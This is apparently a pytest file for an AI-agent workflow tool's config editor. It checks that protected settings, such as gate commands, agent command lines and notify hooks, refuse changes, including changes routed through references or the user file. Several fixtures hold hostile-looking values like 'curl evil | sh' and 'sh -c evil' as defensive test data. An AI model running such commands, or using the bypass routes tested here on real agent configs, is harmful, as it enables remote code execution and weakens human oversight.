def test_form_saves_an_agent_model_into_a_sparse_pack(sparse_repo):
    path = _sparse(sparse_repo)
    models = {**_fields(path)[("agents", "claude", "models")]["value"], "build": "opus"}  # the page sends the whole map
    proposal = _sparse_form(path, (["agents", "claude", "models"], models))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert yaml.safe_load(path.read_text(encoding="utf-8"))["agents"]["claude"] == {
        "permission_mode": "bypassPermissions", "models": {"build": "opus"}}
    assert load_config(path).agents["claude"].models == models


def test_form_offers_agents_and_lanes_on_a_sparse_pack(sparse_repo):
    path = _sparse(sparse_repo)
    path.write_text(path.read_text(encoding="utf-8") + "dashboard:\n  backlog:\n    sync_base: true\n", encoding="utf-8")
    data = config_edit.form_fields(path)
    titles = [s["title"] for s in data["sections"]]
    assert "Agent: claude" in titles and "Agent: codex" in titles and "Phases" in titles
    fields = _fields(path)
    assert fields[("defaults", "agent")]["options"] == ["claude", "codex"]
    assert fields[("dashboard", "backlog", "module_lane")]["options"] == ["feature", "bug", "vuln"]
    proposal = _sparse_form(path, (["dashboard", "backlog", "module_lane"], "bug"), (["defaults", "agent"], "codex"),
                            (["agents", "codex", "enabled"], True))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    cfg = load_config(path)
    assert cfg.dashboard["backlog"]["module_lane"] == "bug" and cfg.defaults.agent == "codex"
    assert cfg.agents["codex"].command == ["codex"]  # the engine's command line, untouched
    with pytest.raises(EditError):
        _sparse_form(path, (["dashboard", "backlog", "module_lane"], "eval"))  # not a lane of the engine workflow


def test_a_field_set_in_the_user_file_is_refused_on_save(sparse_repo):
    path = _sparse(sparse_repo)
    user = _user_file({"defaults": {"run_budget_usd": 9}})
    budget = _fields(path)[("defaults", "run_budget_usd")]
    assert (budget["value"], budget["source"]) == (9, "user")
    assert budget["readonly"] == f"set in your user config ({user}), which overrides the pack"
    text = path.read_text(encoding="utf-8")
    with pytest.raises(Refused, match="user config"):
        _sparse_form(path, (["defaults", "run_budget_usd"], 10))
    assert path.read_text(encoding="utf-8") == text
    assert not _sparse_form(path, (["defaults", "step_timeout_min"], 50)).errors  # the rest of the form still saves


def test_the_settings_form_has_a_soft_and_a_hard_budget(shipped):
    fields = _fields(shipped)
    soft, hard = fields[("defaults", "run_budget_usd")], fields[("defaults", "run_budget_hard_usd")]
    assert soft["label"] == "Soft budget (USD, new runs): notify only"
    assert hard["label"] == "Hard budget (USD, new runs): the run stops for approval"
    assert (hard["kind"], hard["min"], hard["exclusive_min"]) == ("number", 0, True)
    proposal = form(shipped, (["defaults", "run_budget_hard_usd"], 80))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).defaults.run_budget_hard_usd == 80
    below = form(shipped, (["defaults", "run_budget_hard_usd"], 10))  # under the pack's soft budget of 25
    assert "defaults.run_budget_hard_usd" in [i.path for i in below.errors]
    with pytest.raises(EditError):
        form(shipped, (["defaults", "run_budget_hard_usd"], 0))


def test_the_settings_form_has_the_question_kinds_only_a_human_answers(shipped, sparse_repo):
    from agentflow.config import QUESTION_KINDS

    fields = _fields(shipped)
    kinds = fields[("autonomy", "human_question_kinds")]
    assert kinds["label"] == "Question kinds only a human answers"
    assert (kinds["kind"], kinds["options"], kinds["value"]) == ("list", list(QUESTION_KINDS), ["boundary"])
    assert "boundary" in QUESTION_KINDS
    proposal = form(shipped, (["autonomy", "human_question_kinds"], ["boundary", "spec_gap"]))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).autonomy["human_question_kinds"] == ["boundary", "spec_gap"]
    with pytest.raises(EditError):
        form(shipped, (["autonomy", "human_question_kinds"], ["taste"]))  # not a question kind
    sparse = _fields(_sparse(sparse_repo))
    assert sparse[("autonomy", "human_question_kinds")]["help"] == "never answered by the runner"  # the engine's comment
    assert sparse[("autonomy", "answer_recommended")]["help"] == "in every phase, except kinds in human_question_kinds"


def test_a_hard_budget_set_in_the_user_file_is_read_only(sparse_repo):
    path = _sparse(sparse_repo)
    user = _user_file({"defaults": {"run_budget_hard_usd": 90}})
    hard = _fields(path)[("defaults", "run_budget_hard_usd")]
    assert (hard["value"], hard["source"]) == (90, "user")
    assert hard["readonly"] == f"set in your user config ({user}), which overrides the pack"
    with pytest.raises(Refused, match="user config"):
        _sparse_form(path, (["defaults", "run_budget_hard_usd"], 100))


def test_a_map_with_a_user_entry_is_refused_on_save(sparse_repo):
    path = _sparse(sparse_repo)
    _user_file({"agents": {"claude": {"models": {"build": "sonnet"}}}})
    models = _fields(path)[("agents", "claude", "models")]
    assert "user config" in models["readonly"] and models["source"] == "user"
    with pytest.raises(Refused, match="user config"):
        _sparse_form(path, (["agents", "claude", "models"], {**models["value"], "plan": "sonnet"}))
    assert not _fields(path)[("agents", "codex", "models")].get("readonly")


def test_hitl_notify_from_the_user_file_stays_protected_and_names_its_layer(sparse_repo):
    path = _sparse(sparse_repo)
    _user_file({"hitl": {"notify": [{"type": "terminal_bell"}]}})
    data = config_edit.form_fields(path)
    assert ("hitl", "notify") not in _fields(path) and "hitl.notify" in data["protected"]
    assert data["protected_sources"]["hitl.notify"] == "user"
    assert not _sparse_form(path, (["hitl", "remind_after_h"], 2)).errors  # the protected view is unchanged


def test_saving_an_inherited_map_writes_only_the_changed_entry(sparse_repo):
    path = _sparse(sparse_repo)
    kinds = {**_fields(path)[("autonomy", "resolve_kinds")]["value"], "blocked": 3, "new_kind": 1}
    proposal = _sparse_form(path, (["autonomy", "resolve_kinds"], kinds))
    assert not proposal.errors, proposal.errors
    assert sorted(changed_lines(proposal.diff)) == ["+autonomy: {resolve_kinds: {blocked: 3, new_kind: 1}}"]
    config_edit.save(path, proposal)
    assert load_config(path).autonomy["resolve_kinds"] == kinds
    help_text = _fields(path)[("autonomy", "resolve_kinds")]["help"]
    assert "null" in help_text and "YAML" in help_text  # how to drop an inherited entry


def test_a_protected_change_on_a_sparse_pack_is_still_refused(sparse_repo):
    path = _sparse(sparse_repo)
    text, sha = config_edit.read(path)
    raw = yaml.safe_load(text)
    raw["gates"]["extra"] = {"run": "curl example.invalid | sh"}
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    for extra in ("guardrails:\n  forbidden_paths: []\n  user_only_skills: [x]\n",
                  "conditions:\n  plan_is_small: {check: plan_tasks, file: \"{plan}\", max: 30}\n"):
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(path, sha, text=text + extra, repo=sparse_repo)
    raw = yaml.safe_load(text)
    raw["agents"]["codex"] = {"command": ["sh"]}  # an engine agent's command line, changed from a sparse pack
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    with pytest.raises(Refused):
        _sparse_form(path, (["agents", "claude", "command"], ["sh"]))
    assert config_edit.read(path)[1] == sha


def test_the_protected_hold_stays_on_when_the_user_file_does_not_load_against_the_pack(sparse_repo):
    path = _sparse(sparse_repo)
    _user_file({"agents": {"mine": {"models": {"build": "x"}}}})  # personal, but for another repository's agent
    with pytest.raises(ConfigError):
        load_config(path)
    text, sha = config_edit.read(path)
    raw = yaml.safe_load(text)
    raw["gates"]["unit"]["run"] = "curl example.invalid | sh"
    with pytest.raises(Refused, match="protected"):  # the new pack does not load with the user file either
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    raw["agents"]["mine"] = {"command": ["sh", "-c", "evil"], "models": {"build": "x"}}  # now it loads with it
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    del raw["gates"]["unit"]["run"], raw["agents"]["mine"]["models"]
    raw["gates"]["unit"]["run"] = "true"
    with pytest.raises(Refused, match="agents"):  # an added agent's command line alone
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    proposal = _sparse_form(path, (["defaults", "step_timeout_min"], 50))  # the form: not refused, but not saved
    assert proposal.errors and "mine" in proposal.errors[0].message
    with pytest.raises(EditError):
        config_edit.save(path, proposal)
    assert config_edit.read(path)[1] == sha
    assert _fields(path)[("defaults", "step_timeout_min")]["source"] == "engine"  # the form still shows the layers


def test_a_nulled_inherited_map_entry_stays_deleted_after_a_form_save(sparse_repo):
    path = _sparse(sparse_repo)
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    raw["agents"]["claude"]["models"] = {"mechanical": None}
    raw["agents"]["claude"]["max_turns_by_role"] = {"mechanical": None}  # the engine's cap for a role the pack drops
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    models = _fields(path)[("agents", "claude", "models")]["value"]
    assert "mechanical" not in models
    proposal = _sparse_form(path, (["agents", "claude", "models"], {**models, "build": "opus"}))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert yaml.safe_load(path.read_text(encoding="utf-8"))["agents"]["claude"]["models"] == {
        "mechanical": None, "build": "opus"}
    effective = load_config(path).agents["claude"].models
    assert "mechanical" not in effective and effective["build"] == "opus"


def _ref_pack(path: Path) -> dict:
    """The sparse pack with its gate's command behind a reference to a key that is not protected."""
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    raw["gates"]["unit"]["run"] = "@defaults.gate_cmd"
    raw["defaults"] = {"gate_cmd": "true"}
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    return raw


def test_a_reference_into_the_user_file_cannot_slip_a_protected_change_through(sparse_repo):
    path = _sparse(sparse_repo)
    raw = _ref_pack(path)
    _user_file({"hitl": {"notify": ["desktop"]}})  # the engine ships `hitl: {}`: only the user file has this key
    _, sha = config_edit.read(path)
    raw["defaults"]["gate_cmd"] = "curl evil | sh"
    with pytest.raises(Refused, match="gates"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # now the new pack loads only with the user file
    with pytest.raises(Refused, match="gates"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert load_config(path).raw["gates"]["unit"]["run"] == "true" and config_edit.read(path)[1] == sha


def test_a_pack_that_loads_only_with_the_user_file_is_an_error(sparse_repo):
    path = _sparse(sparse_repo)
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    _user_file({"hitl": {"notify": ["desktop"]}})
    _, sha = config_edit.read(path)
    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # benign, but it breaks for a teammate and for CI
    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert [i.message for i in proposal.errors if "without your personal user file" in i.message]
    with pytest.raises(EditError):
        config_edit.save(path, proposal)
    assert config_edit.read(path)[1] == sha


def test_an_on_disk_pack_that_needs_the_user_file_still_holds_the_protected_settings(sparse_repo):
    path = _sparse(sparse_repo)
    raw = _ref_pack(path)
    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # already on disk: the pack loads only with the user file
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    _user_file({"hitl": {"notify": ["desktop"]}})
    load_config(path)
    with pytest.raises(ConfigError):
        load_config(path, user=False)
    _, sha = config_edit.read(path)
    del raw["dashboard"]  # the new pack loads both ways, and changes the gate through the reference
    raw["defaults"]["gate_cmd"] = "curl evil | sh"
    with pytest.raises(Refused, match="gates"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    raw["defaults"]["gate_cmd"] = "true"  # the repair itself is fine
    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert load_config(path, user=False).raw["gates"]["unit"]["run"] == "true"


def test_a_pack_that_loads_without_the_user_file_saves_benign_changes_beside_one(sparse_repo):
    path = _sparse(sparse_repo)
    _ref_pack(path)
    _user_file({"hitl": {"notify": ["desktop"], "remind_after_h": 2}, "defaults": {"run_budget_usd": 9}})
    proposal = _sparse_form(path, (["defaults", "step_timeout_min"], 50), (["ci", "poll_s"], 30))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    text, sha = config_edit.read(path)
    proposal = config_edit.propose(path, sha, text=text + "recovery:\n  give_up_h: 12\n", repo=sparse_repo)
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    cfg = load_config(path)
    assert (cfg.defaults.step_timeout_min, cfg.ci["poll_s"], cfg.recovery.give_up_h) == (50, 30, 12)
    assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.run_budget_usd == 9


def _needs_user_on_disk(path: Path, edit, user: dict) -> dict:
    """Write the sparse pack changed by `edit` so that it loads only with the user file `user`; its data."""
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    edit(raw)
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    _user_file(user)
    load_config(path)
    with pytest.raises(ConfigError):
        load_config(path, user=False)
    return raw


def _refused_and_unchanged(path: Path, repo: Path, raw: dict, match: str = "gates") -> None:
    text, sha = config_edit.read(path)
    with pytest.raises(Refused, match=match):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=repo)
    assert config_edit.read(path) == (text, sha)


def _gate_behind_a_model(raw: dict) -> None:
    raw["gates"]["unit"]["run"] = "@agents.claude.models.gate"


def test_a_repair_cannot_hide_a_gate_change_behind_a_key_the_user_file_overrides(sparse_repo):  # case A
    path = _sparse(sparse_repo)

    def edit(raw: dict) -> None:
        _gate_behind_a_model(raw)
        raw["agents"]["claude"]["models"] = {"gate": "true"}
        raw["dashboard"] = {"x_ref": "@hitl.notify"}  # the only reason the pack needs the user file

    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"]},
                                           "agents": {"claude": {"models": {"gate": "true"}}}})
    del raw["dashboard"]
    raw["agents"]["claude"]["models"]["gate"] = "curl evil | sh"  # with the user file it still reads `true`
    _refused_and_unchanged(path, sparse_repo, raw)


def test_a_pack_cannot_define_a_key_its_gate_took_from_the_user_file(sparse_repo):  # case C
    path = _sparse(sparse_repo)
    raw = _needs_user_on_disk(path, _gate_behind_a_model, {"agents": {"claude": {"models": {"gate": "true"}}}})
    raw["agents"]["claude"]["models"] = {"gate": "curl evil | sh"}  # the gate's own text is untouched
    _refused_and_unchanged(path, sparse_repo, raw)


def test_a_pack_cannot_set_a_personal_key_its_gate_takes_from_the_user_file(sparse_repo):  # case D
    path = _sparse(sparse_repo)
    raw = _needs_user_on_disk(path, lambda r: r["gates"]["unit"].update(run="@hitl.notify.0"),
                              {"hitl": {"notify": ["true"]}})
    raw["hitl"] = {"notify": ["curl evil | sh"]}
    _refused_and_unchanged(path, sparse_repo, raw, match="gates|hitl.notify")


def test_the_repair_of_a_pack_that_needs_the_user_file_still_saves(sparse_repo):
    path = _sparse(sparse_repo)

    def edit(raw: dict) -> None:
        _gate_behind_a_model(raw)
        raw["agents"]["claude"]["models"] = {"gate": "true"}
        raw["dashboard"] = {"x_ref": "@hitl.notify"}

    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"]},
                                           "agents": {"claude": {"models": {"gate": "true"}}}})
    del raw["dashboard"]
    raw["defaults"] = {"step_timeout_min": 40}
    _, sha = config_edit.read(path)
    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    for user in (True, False):
        cfg = load_config(path, user=user)
        assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.step_timeout_min == 40


def test_a_repair_cannot_change_notify_through_a_reference_the_user_file_hides(sparse_repo):  # hole E
    path = _sparse(sparse_repo)

    def edit(raw: dict) -> None:
        raw["hitl"] = {"notify": "@defaults.notify_with"}
        raw["defaults"] = {"notify_with": ["desktop"]}
        raw["dashboard"] = {"x_ref": "@hitl.remind_after_h"}  # the only reason the pack needs the user file

    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"], "remind_after_h": 2}})
    del raw["dashboard"]
    raw["defaults"]["notify_with"] = ["curl evil | sh"]  # with the user file, notify still reads the user's value
    _refused_and_unchanged(path, sparse_repo, raw, match="hitl.notify")


def test_an_on_disk_pack_that_loads_neither_way_still_holds_the_protected_settings_as_written(sparse_repo):
    path = _sparse(sparse_repo)
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    raw["dashboard"] = {"x_ref": "@no.such.key"}  # broken with or without the user file
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    for user in (True, False):
        with pytest.raises(ConfigError):
            load_config(path, user=user)
    del raw["dashboard"]
    raw["gates"]["unit"]["run"] = "curl evil | sh"  # a repair that loads both ways, and changes the gate
    _refused_and_unchanged(path, sparse_repo, raw)
    raw["engine"] = ">=99"  # a new text that does not load either: still held
    _refused_and_unchanged(path, sparse_repo, raw, match="engine|gates")
    raw["gates"]["unit"]["run"], raw["engine"] = "true", ">=3,<4"  # the repair alone saves
    _, sha = config_edit.read(path)
    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert load_config(path, user=False).raw["gates"]["unit"]["run"] == "true"


# --------------------------------------------------------------------------- starters


def test_starter_is_protected_on_the_page(sparse_repo):
    path = _sparse(sparse_repo)
    assert "starter" in config_edit._PROTECTED_KEYS and "starter" in config_edit.form_fields(path)["protected"]
    text, sha = config_edit.read(path)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=text + "starter: go\n", repo=sparse_repo)
    path.write_text(text + "starter: go\n", encoding="utf-8")
    text, sha = config_edit.read(path)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=text.replace("starter: go", "starter: docs-only"), repo=sparse_repo)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=text.replace("starter: go\n", ""), repo=sparse_repo)


@pytest.mark.parametrize("change", ["gates_confirmed: false", "gates.unit.baseline: red", "gates.unit.cwd: x"])
def test_gate_confirmation_and_gate_fields_are_protected(sparse_repo, change):
    path = _sparse(sparse_repo)
    assert "gates_confirmed" in config_edit._PROTECTED_KEYS and "gates_confirmed" in config_edit.form_fields(path)["protected"]
    path.write_text(path.read_text(encoding="utf-8") + "gates_confirmed: true\n", encoding="utf-8")  # a human confirmed
    text, sha = config_edit.read(path)
    raw = yaml.safe_load(text)
    key, value = change.split(": ")
    if key == "gates_confirmed":
        raw[key] = False
    else:
        _, name, field = key.split(".")
        raw["gates"][name][field] = value
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)


def _custom_starter(monkeypatch, tmp_path: Path, body: str) -> None:
    from agentflow import layers

    (tmp_path / "starters" / "custom").mkdir(parents=True)
    (tmp_path / "starters" / "custom" / "config.yaml").write_text(body, encoding="utf-8")
    monkeypatch.setattr(layers, "STARTERS", tmp_path / "starters")


def test_a_starter_is_a_layer_below_the_pack_on_the_page(sparse_repo, monkeypatch, tmp_path):
    _custom_starter(monkeypatch, tmp_path, "gates: {unit: {run: 'true'}}\n"
                    "hitl:\n  remind_after_h: 5   # a starter's own note\n"
                    "autonomy:\n  resolve_kinds: {blocked: 4}\n")
    path = _sparse(sparse_repo)
    path.write_text(path.read_text(encoding="utf-8") + "starter: custom\n", encoding="utf-8")
    fields = _fields(path)
    remind = fields[("hitl", "remind_after_h")]
    assert remind["value"] == 5 and remind["source"] == "starter:custom" and remind["help"] == "a starter's own note"
    kinds = fields[("autonomy", "resolve_kinds")]
    assert kinds["value"]["blocked"] == 4 and kinds["source"] == "starter:custom"
    changed = {**kinds["value"], "new_kind": 1}  # only the entry the starter and the engine don't say is written
    proposal = _sparse_form(path, (["autonomy", "resolve_kinds"], changed))
    assert not proposal.errors, proposal.errors
    assert sorted(changed_lines(proposal.diff)) == ["+autonomy: {resolve_kinds: {new_kind: 1}}"]
    config_edit.save(path, proposal)
    assert load_config(path).autonomy["resolve_kinds"] == changed


# --------------------------------------------------------------------------- the Issues section


def test_the_issues_section_edits_round_trip(sparse_repo):
    path = _sparse(sparse_repo)
    fields = _fields(path)
    assert fields[("issues", "in_progress_label")]["source"] == "engine"
    proposal = _sparse_form(path, (["issues", "in_progress_label"], ""), (["issues", "comment"], False),
                            (["issues", "epic_labels"], ["epic", "initiative"]))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    cfg = load_config(path)
    assert (cfg.issues.in_progress_label, cfg.issues.comment, cfg.issues.epic_labels) == ("", False, ("epic", "initiative"))


def test_the_issue_sync_fields_round_trip(sparse_repo):
    path = _sparse(sparse_repo)
    fields = _fields(path)
    assert (fields[("issues", "sync_label")]["value"], fields[("issues", "sync_label")]["source"]) == ("", "engine")
    assert fields[("issues", "lane_labels")]["value"] == {"bug": "bug"}
    proposal = _sparse_form(path, (["issues", "sync_label"], "agentflow"), (["issues", "sync_lane"], "bug"),
                            (["issues", "lane_labels"], {"bug": "bug", "type: bug": "bug"}))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    cfg = load_config(path)
    assert (cfg.issues.sync_label, cfg.issues.sync_lane) == ("agentflow", "bug")
    assert cfg.issues.lane_labels == {"bug": "bug", "type: bug": "bug"}


def test_a_star_sync_label_saves_and_validates(sparse_repo):
    path = _sparse(sparse_repo)
    proposal = _sparse_form(path, (["issues", "sync_label"], "*"))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert load_config(path).issues.sync_label == "*"


@pytest.mark.parametrize("key, value", [
    (["issues", "in_progress_label"], "a,b"),    # validate refuses it
    (["issues", "in_progress_label"], "two\nlines"),  # allow_empty keeps the newline check
    (["issues", "in_progress_label"], "x" * 501),      # and the length check
    (["issues", "comment"], "no"),               # the field's kind
    (["issues", "epic_labels"], "epic"),         # not a list
    (["issues", "sync_label"], "a,b"),           # validate refuses it
    (["issues", "sync_label"], "-x"),            # it would read as a gh flag
    (["issues", "sync_label"], "AgentFlow:In-Progress"),  # the in-progress label, compared without case
    (["issues", "sync_lane"], "nope"),           # not a lane
    (["issues", "lane_labels"], "bug"),          # not a map
])
def test_the_issues_section_refuses_bad_values(sparse_repo, key, value):
    path = _sparse(sparse_repo)
    try:
        proposal = _sparse_form(path, (key, value))
    except EditError:
        return
    assert proposal.errors


def test_gate_inputs_are_protected(shipped):
    _, sha = config_edit.read(shipped)
    old = 'floor:        {run: "true"}'
    assert old in SHIPPED
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED.replace(old, 'floor:        {run: "true", inputs: ["api/**"]}', 1),
                            repo=REPO)


def test_gate_affected_and_gate_tier_are_protected(shipped):
    _, sha = config_edit.read(shipped)
    old = 'floor:        {run: "true"}'
    assert old in SHIPPED
    affected = 'floor:        {run: "true", affected: {run: "true {paths}", paths: ["**/*.py"]}}'
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED.replace(old, affected, 1), repo=REPO)
    step = 'when: refine_round, gates: verify, fix_loop: true, commit: true, message: "Fix findings"}'
    assert SHIPPED.count(step) == 1
    tiered = step.replace("gates: verify,", "gates: verify, gate_tier: affected,")
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED.replace(step, tiered, 1), repo=REPO)


def test_the_form_sets_how_many_done_cards_show(shipped):
    config_edit.save(shipped, form(shipped, (["dashboard", "done_shown"], 25)))
    assert load_config(shipped).dashboard["done_shown"] == 25
    with pytest.raises(config_edit.EditError):
        form(shipped, (["dashboard", "done_shown"], 0))


def test_the_form_sets_the_inbox_legacy_switch(shipped):
    config_edit.save(shipped, form(shipped, (["dashboard", "inbox_legacy"], True)))
    assert load_config(shipped).dashboard["inbox_legacy"] is True


def test_route_mode_is_a_form_field(shipped):
    shipped.write_text(SHIPPED + 'route: {mode: "off"}\n', encoding="utf-8")  # the python pack writes its workflow
    fields = {tuple(f["key"]): f for section in config_edit.form_fields(shipped)["sections"]
              for f in section["fields"]}
    assert fields[("route", "mode")]["options"] == ["off", "observe", "on"]
    proposal = form(shipped, (["route", "mode"], "observe"))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).route.mode == "observe"
    with pytest.raises(EditError):
        form(shipped, (["route", "mode"], "sometimes"))


def test_route_profiles_are_protected(shipped):
    assert "route.profiles" in config_edit.PROTECTED and "route.lanes" in config_edit.PROTECTED
    for key in (["route", "profiles", "S", "per_task_review"], ["route", "lanes"]):
        with pytest.raises(Refused):  # the form has no field for it
            form(shipped, (key, False))
    _, sha = config_edit.read(shipped)
    for added in ("route: {profiles: {S: {per_task_review: false}}}\n", "route: {lanes: [feature, bug]}\n"):
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED + added, repo=REPO)


def test_the_form_sets_the_parallel_keys(shipped):
    fields = {tuple(f["key"]): f for s in config_edit.form_fields(shipped)["sections"] for f in s["fields"]}
    assert fields[("parallel", "max_subagents")]["kind"] == "int" and fields[("parallel", "max_subagents")]["min"] == 1
    assert fields[("parallel", "max_subagents")]["max"] == 6
    assert fields[("parallel", "serial_paths")]["kind"] == "list"
    proposal = form(shipped, (["parallel", "max_subagents"], 3), (["parallel", "serial_paths"], ["**/migrations/**", "uv.lock"]))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    cfg = load_config(shipped)
    assert cfg.parallel.max_subagents == 3 and cfg.parallel.serial_paths == ["**/migrations/**", "uv.lock"]
    for bad in (0, 7, True, "3"):
        with pytest.raises(EditError):
            form(shipped, (["parallel", "max_subagents"], bad))
    with pytest.raises(EditError):
        form(shipped, (["parallel", "serial_paths"], "uv.lock"))


def test_the_form_sets_the_slot_keys(shipped):
    fields = {tuple(f["key"]): f for s in config_edit.form_fields(shipped)["sections"] for f in s["fields"]}
    assert fields[("slots", "count")]["kind"] == "int"
    assert (fields[("slots", "count")]["min"], fields[("slots", "count")]["max"]) == (1, 16)
    assert fields[("queue", "human_slot")]["kind"] == "int"
    assert (fields[("queue", "human_slot")]["min"], fields[("queue", "human_slot")]["max"]) == (0, 16)
    proposal = form(shipped, (["slots", "count"], 3), (["queue", "human_slot"], 0))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    cfg = load_config(shipped)
    assert cfg.slots.count == 3 and cfg.queue.human_slot == 0
    for bad in (0, 17, True, "3"):
        with pytest.raises(EditError):
            form(shipped, (["slots", "count"], bad))


def test_the_wave_skill_and_review_keys_are_protected(shipped):
    assert "skills" in config_edit.PROTECTED and "route.profiles" in config_edit.PROTECTED
    for key, value in ((["skills", "map", "build_wave"], "agentflow-build"),
                       (["route", "profiles", "L", "wave_review"], False)):
        with pytest.raises(Refused):  # the form has no field for either
            form(shipped, (key, value))
    _, sha = config_edit.read(shipped)
    for added in ("skills: {map: {build_wave: agentflow-build}}\n",
                  "route: {profiles: {L: {wave_review: false}}}\n"):
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED + added, repo=REPO)


def test_the_form_sets_the_claude_cache_keys(shipped):
    for key, value in ((["agents", "claude", "cache_ttl"], "1h"), (["agents", "claude", "lean"], False),
                       (["agents", "claude", "user_settings"], True)):
        config_edit.save(shipped, form(shipped, (key, value)))
    spec = load_config(shipped).agents["claude"]
    assert (spec.cache_ttl, spec.lean, spec.user_settings) == ("1h", False, True)
    with pytest.raises(EditError):
        form(shipped, (["agents", "claude", "cache_ttl"], "10m"))


def test_read_only_roles_and_idle_are_editable(shipped):
    fields = {tuple(f["key"]): f for s in config_edit.form_fields(shipped)["sections"] for f in s["fields"]}
    assert fields[("agents", "claude", "read_only_roles")]["kind"] == "list"
    idle = fields[("watchdog", "read_only_idle_min")]
    assert idle["kind"] == "number" and idle["min"] == 0 and idle["max"] == 1440
    text = shipped.read_text(encoding="utf-8")
    config_edit.save(shipped, form(shipped, (["agents", "claude", "read_only_roles"], ["review", "debug"]),
                                   (["watchdog", "read_only_idle_min"], 3)))
    cfg = load_config(shipped)
    assert cfg.agents["claude"].read_only_roles == ("review", "debug") and cfg.watchdog.read_only_idle_min == 3
    after = shipped.read_text(encoding="utf-8")
    assert sum(1 for line in after.splitlines() if "#" in line) >= sum(1 for line in text.splitlines() if "#" in line)
    for bad in (-1, 1441):
        with pytest.raises(EditError):
            form(shipped, (["watchdog", "read_only_idle_min"], bad))


def test_the_codex_section_has_no_claude_cache_fields(shipped):
    keys = {tuple(f["key"]) for s in config_edit.form_fields(shipped)["sections"] for f in s["fields"]}
    assert ("agents", "claude", "lean") in keys and ("agents", "codex", "lean") not in keys
    assert ("agents", "claude", "read_only_roles") in keys and ("agents", "codex", "read_only_roles") not in keys
    assert config_edit.AGENT_FREE_KEYS[-7:] == ("cache_ttl", "lean", "user_settings", "read_only_roles",
                                                "max_turns_by_role", "session_budget_usd", "bash_output_chars")
    assert "read_only_roles, max_turns_by_role, session_budget_usd, bash_output_chars" in " ".join(config_edit.PROTECTED)
    for key in ("max_turns_by_role", "session_budget_usd", "bash_output_chars"):
        assert ("agents", "claude", key) in keys and ("agents", "codex", key) not in keys


def test_cap_fields_are_editable(shipped):
    fields = {tuple(f["key"]): f for s in config_edit.form_fields(shipped)["sections"] for f in s["fields"]}
    assert fields[("agents", "claude", "max_turns_by_role")]["value_kind"] == "int"
    assert fields[("agents", "claude", "session_budget_usd")]["value_kind"] == "number"
